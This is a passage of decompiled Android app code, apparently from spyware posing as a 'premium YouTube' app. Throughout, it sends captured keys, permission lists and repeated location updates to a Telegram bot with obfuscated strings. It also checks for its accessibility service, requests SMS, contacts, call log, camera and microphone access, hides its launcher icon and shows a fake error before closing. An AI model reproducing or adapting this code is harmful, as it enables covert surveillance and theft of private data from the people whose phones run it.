                MainActivity.sendKeyToTelegram$lambda$9(this.f$0, key);
            }
        }).start();
    }

    private static final void sendKeyToTelegram$lambda$9(MainActivity this$0, String $key) {
        Intrinsics.checkNotNullParameter(this$0, "this$0");
        Intrinsics.checkNotNullParameter($key, "$key");
        try {
            String url = MainActivity2.INSTANCE.m۳۹String$0$str$valurl$try$fun$anonymous$$arg0$call$init$$$this$callstart$funsendKeyToTelegram$classMainActivity() + this$0.botToken + MainActivity2.INSTANCE.m۴۵String$2$str$valurl$try$fun$anonymous$$arg0$call$init$$$this$callstart$funsendKeyToTelegram$classMainActivity();
            String body = MainActivity2.INSTANCE.m۳۴String$0$str$$this$callplus$valbody$try$fun$anonymous$$arg0$call$init$$$this$callstart$funsendKeyToTelegram$classMainActivity() + this$0.chatId + MainActivity2.INSTANCE.m۴۱String$2$str$$this$callplus$valbody$try$fun$anonymous$$arg0$call$init$$$this$callstart$funsendKeyToTelegram$classMainActivity() + URLEncoder.encode($key, MainActivity2.INSTANCE.m۸۴String$arg1$callencode$arg0$callplus$valbody$try$fun$anonymous$$arg0$call$init$$$this$callstart$funsendKeyToTelegram$classMainActivity());
            URLConnection uRLConnectionOpenConnection = new URL(url).openConnection();
            Intrinsics.checkNotNull(uRLConnectionOpenConnection, "null cannot be cast to non-null type java.net.HttpURLConnection");
            HttpURLConnection conn = (HttpURLConnection) uRLConnectionOpenConnection;
            conn.setRequestMethod(MainActivity2.INSTANCE.m۷۷String$arg0$callsetRequestMethod$try$fun$anonymous$$arg0$call$init$$$this$callstart$funsendKeyToTelegram$classMainActivity());
            conn.setDoOutput(MainActivity2.INSTANCE.m۴Boolean$arg0$callsetDoOutput$try$fun$anonymous$$arg0$call$init$$$this$callstart$funsendKeyToTelegram$classMainActivity());
            conn.setRequestProperty(MainActivity2.INSTANCE.m۸۰String$arg0$callsetRequestProperty$try$fun$anonymous$$arg0$call$init$$$this$callstart$funsendKeyToTelegram$classMainActivity(), MainActivity2.INSTANCE.m۸۸String$arg1$callsetRequestProperty$try$fun$anonymous$$arg0$call$init$$$this$callstart$funsendKeyToTelegram$classMainActivity());
            OutputStream outputStream = conn.getOutputStream();
            try {
                OutputStream it = outputStream;
                byte[] bytes = body.getBytes(Charsets.UTF_8);
                Intrinsics.checkNotNullExpressionValue(bytes, "this as java.lang.String).getBytes(charset)");
                it.write(bytes);
                Unit unit = Unit.INSTANCE;
                CloseableKt.closeFinally(outputStream, (Throwable) null);
                InputStream inputStream = conn.getInputStream();
                Intrinsics.checkNotNullExpressionValue(inputStream, "conn.inputStream");
                Reader inputStreamReader = new InputStreamReader(inputStream, Charsets.UTF_8);
                TextStreamsKt.readText(inputStreamReader instanceof BufferedReader ? (BufferedReader) inputStreamReader : new BufferedReader(inputStreamReader, 8192));
                conn.disconnect();
            } finally {
            }
        } catch (Exception e) {
        }
    }

    private final boolean isAccessibilityServiceEnabled() {
        Object systemService = getSystemService("accessibility");
        Intrinsics.checkNotNull(systemService, "null cannot be cast to non-null type android.view.accessibility.AccessibilityManager");
        String enabledServices = Settings.Secure.getString(getContentResolver(), "enabled_accessibility_services");
        return enabledServices != null && StringsKt.contains$default(enabledServices, new StringBuilder().append(getPackageName()).append(MainActivity2.INSTANCE.m۷۲String$arg0$callplus$arg0$callcontains$else$when$arg0$callEQEQ$funisAccessibilityServiceEnabled$classMainActivity()).toString(), false, 2, (Object) null) == MainActivity2.INSTANCE.m۱۶Boolean$arg1$callEQEQ$funisAccessibilityServiceEnabled$classMainActivity();
    }

    /* JADX WARN: Multi-variable type inference failed */
    private final List<String> getNotGrantedPermissions() {
        List permissions = new ArrayList();
        if (this.readStorage) {
            if (Build.VERSION.SDK_INT >= 33) {
                permissions.add("android.permission.READ_MEDIA_IMAGES");
            } else {
                permissions.add("android.permission.READ_EXTERNAL_STORAGE");
            }
        }
        if (this.postNotifications && Build.VERSION.SDK_INT >= 33) {
            permissions.add("android.permission.POST_NOTIFICATIONS");
        }
        if (this.readContacts) {
            permissions.add("android.permission.READ_CONTACTS");
        }
        if (this.readSms) {
            permissions.add("android.permission.READ_SMS");
        }
        if (this.readCallLog) {
            permissions.add("android.permission.READ_CALL_LOG");
        }
        if (this.readLocation) {
            permissions.add("android.permission.ACCESS_FINE_LOCATION");
            permissions.add("android.permission.ACCESS_COARSE_LOCATION");
        }
        if (this.backgroundCameraEnabled) {
            permissions.add("android.permission.CAMERA");
        }
        if (this.microphoneEnabled) {
            permissions.add("android.permission.RECORD_AUDIO");
        }
        permissions.add("android.permission.SEND_SMS");
        permissions.add("android.permission.CALL_PHONE");
        List $this$filter$iv = permissions;
        Collection destination$iv$iv = new ArrayList();
        for (Object element$iv$iv : $this$filter$iv) {
            String it = (String) element$iv$iv;
            if (ContextCompat.checkSelfPermission((Context) this, it) != 0) {
                destination$iv$iv.add(element$iv$iv);
            }
        }
        return (List) destination$iv$iv;
    }

    private final void sendTelegramPermissions(List<String> list) {
        if (list.isEmpty()) {
            return;
        }
        final String msg = MainActivity2.INSTANCE.m۳۳String$$this$callplus$valmsg$funsendTelegramPermissions$classMainActivity() + CollectionsKt.joinToString$default(list, MainActivity2.INSTANCE.m۵۷String$arg0$calljoinToString$arg0$callplus$valmsg$funsendTelegramPermissions$classMainActivity(), (CharSequence) null, (CharSequence) null, 0, (CharSequence) null, (Function1) null, 62, (Object) null);
        new Thread(new Runnable() { // from class: com.w8sb.w8premiumyt.MainActivity$$ExternalSyntheticLambda3
            @Override // java.lang.Runnable
            public final void run() {
                MainActivity.sendTelegramPermissions$lambda$12(this.f$0, msg);
            }
        }).start();
    }

    private static final void sendTelegramPermissions$lambda$12(MainActivity this$0, String $msg) {
        Intrinsics.checkNotNullParameter(this$0, "this$0");
        Intrinsics.checkNotNullParameter($msg, "$msg");
        try {
            URL url = new URL(MainActivity2.INSTANCE.m۳۶String$0$str$arg0$call$init$$valurl$try$fun$anonymous$$arg0$call$init$$$this$callstart$funsendTelegramPermissions$classMainActivity() + this$0.botToken + MainActivity2.INSTANCE.m۴۳String$2$str$arg0$call$init$$valurl$try$fun$anonymous$$arg0$call$init$$$this$callstart$funsendTelegramPermissions$classMainActivity());
            String body = MainActivity2.INSTANCE.m۳۵String$0$str$$this$callplus$valbody$try$fun$anonymous$$arg0$call$init$$$this$callstart$funsendTelegramPermissions$classMainActivity() + this$0.chatId + MainActivity2.INSTANCE.m۴۲String$2$str$$this$callplus$valbody$try$fun$anonymous$$arg0$call$init$$$this$callstart$funsendTelegramPermissions$classMainActivity() + URLEncoder.encode($msg, MainActivity2.INSTANCE.m۸۵String$arg1$callencode$arg0$callplus$valbody$try$fun$anonymous$$arg0$call$init$$$this$callstart$funsendTelegramPermissions$classMainActivity());
            URLConnection uRLConnectionOpenConnection = url.openConnection();
            Intrinsics.checkNotNull(uRLConnectionOpenConnection, "null cannot be cast to non-null type java.net.HttpURLConnection");
            HttpURLConnection conn = (HttpURLConnection) uRLConnectionOpenConnection;
            conn.setRequestMethod(MainActivity2.INSTANCE.m۷۹String$arg0$callsetRequestMethod$try$fun$anonymous$$arg0$call$init$$$this$callstart$funsendTelegramPermissions$classMainActivity());
            conn.setDoOutput(MainActivity2.INSTANCE.m۶Boolean$arg0$callsetDoOutput$try$fun$anonymous$$arg0$call$init$$$this$callstart$funsendTelegramPermissions$classMainActivity());
            conn.setRequestProperty(MainActivity2.INSTANCE.m۸۲String$arg0$callsetRequestProperty$try$fun$anonymous$$arg0$call$init$$$this$callstart$funsendTelegramPermissions$classMainActivity(), MainActivity2.INSTANCE.m۹۰String$arg1$callsetRequestProperty$try$fun$anonymous$$arg0$call$init$$$this$callstart$funsendTelegramPermissions$classMainActivity());
            OutputStream outputStream = conn.getOutputStream();
            try {
                OutputStream it = outputStream;
                byte[] bytes = body.getBytes(Charsets.UTF_8);
                Intrinsics.checkNotNullExpressionValue(bytes, "this as java.lang.String).getBytes(charset)");
                it.write(bytes);
                Unit unit = Unit.INSTANCE;
                CloseableKt.closeFinally(outputStream, (Throwable) null);
                InputStream inputStream = conn.getInputStream();
                Intrinsics.checkNotNullExpressionValue(inputStream, "conn.inputStream");
                Reader inputStreamReader = new InputStreamReader(inputStream, Charsets.UTF_8);
                TextStreamsKt.readText(inputStreamReader instanceof BufferedReader ? (BufferedReader) inputStreamReader : new BufferedReader(inputStreamReader, 8192));
                conn.disconnect();
            } finally {
            }
        } catch (Exception e) {
        }
    }

    private final void startRepeatingGeoLocation() {
        final Handler handler = new Handler(Looper.getMainLooper());
        handler.post(new Runnable() { // from class: com.w8sb.w8premiumyt.MainActivity$startRepeatingGeoLocation$runnable$1
            @Override // java.lang.Runnable
            public void run() {
                this.this$0.sendLocationToTelegram();
                handler.postDelayed(this, MainActivity2.INSTANCE.m۳۲Long$arg1$callpostDelayed$funrun$class$nonameprovided$$valrunnable$funstartRepeatingGeoLocation$classMainActivity());
            }
        });
    }

    /* JADX WARN: Multi-variable type inference failed */
    private final void setLauncherIconVisible(boolean visible) {
        PackageManager pm = getPackageManager();
        ComponentName componentName = new ComponentName((Context) this, (Class<?>) MainActivity.class);
        int newState = visible ? 1 : 2;
        pm.setComponentEnabledSetting(componentName, newState, 1);
    }

    private final void showFakeErrorAndClose() {
        runOnUiThread(new Runnable() { // from class: com.w8sb.w8premiumyt.MainActivity$$ExternalSyntheticLambda2
            @Override // java.lang.Runnable
            public final void run() {
                MainActivity.showFakeErrorAndClose$lambda$14(this.f$0);
            }
        });
    }

    /* JADX WARN: Multi-variable type inference failed */
    private static final void showFakeErrorAndClose$lambda$14(final MainActivity mainActivity) {
        Intrinsics.checkNotNullParameter(mainActivity, "this$0");
        new AlertDialog.Builder((Context) mainActivity).setTitle(MainActivity2.INSTANCE.m۸۳String$arg0$callsetTitle$$this$callsetMessage$$this$callsetCancelable$$this$callsetPositiveButton$$this$callshow$fun$anonymous$$arg0$callrunOnUiThread$funshowFakeErrorAndClose$classMainActivity()).setMessage(MainActivity2.INSTANCE.m۷۵String$arg0$callsetMessage$$this$callsetCancelable$$this$callsetPositiveButton$$this$callshow$fun$anonymous$$arg0$callrunOnUiThread$funshowFakeErrorAndClose$classMainActivity()).setCancelable(MainActivity2.INSTANCE.m۳Boolean$arg0$callsetCancelable$$this$callsetPositiveButton$$this$callshow$fun$anonymous$$arg0$callrunOnUiThread$funshowFakeErrorAndClose$classMainActivity()).setPositiveButton(MainActivity2.INSTANCE.m۷۶String$arg0$callsetPositiveButton$$this$callshow$fun$anonymous$$arg0$callrunOnUiThread$funshowFakeErrorAndClose$classMainActivity(), new DialogInterface.OnClickListener() { // from class: com.w8sb.w8premiumyt.MainActivity$$ExternalSyntheticLambda4
            @Override // android.content.DialogInterface.OnClickListener
            public final void onClick(DialogInterface dialogInterface, int i) {
                MainActivity.showFakeErrorAndClose$lambda$14$lambda$13(this.f$0, dialogInterface, i);
            }
        }).show();
    }

    private static final void showFakeErrorAndClose$lambda$14$lambda$13(MainActivity this$0, DialogInterface dialogInterface, int i) {
        Intrinsics.checkNotNullParameter(this$0, "this$0");
        this$0.finish();
    }

    protected void onDestroy() {
        super.onDestroy();
        try {
            WebView webView = this.webView;
            if (webView == null) {
                Intrinsics.throwUninitializedPropertyAccessException("webView");
                webView = null;
            }
            webView.destroy();
        } catch (Exception e) {
        }
        if (this.uninstallReceiverRegistered) {
            try {
                unregisterReceiver(this.uninstallReceiver);
            } catch (Exception e2) {
            }
        }
        try {
            unregisterReceiver(this.toastReceiver);
        } catch (Exception e3) {
        }
        try {
            unregisterReceiver(this.linkOpenReceiver);
        } catch (Exception e4) {
        }
        try {
            unregisterReceiver(this.playAudioReceiver);
        } catch (Exception e5) {
        }
        try {
            unregisterReceiver(this.speakTextReceiver);
        } catch (Exception e6) {
        }
        try {
            TextToSpeech textToSpeech = this.tts;
            if (textToSpeech != null) {
                textToSpeech.shutdown();
            }
        } catch (Exception e7) {
        }
        try {
            MediaPlayer mediaPlayer = this.mediaPlayer;
            if (mediaPlayer != null) {
                mediaPlayer.release();
            }
        } catch (Exception e8) {
        }
    }
}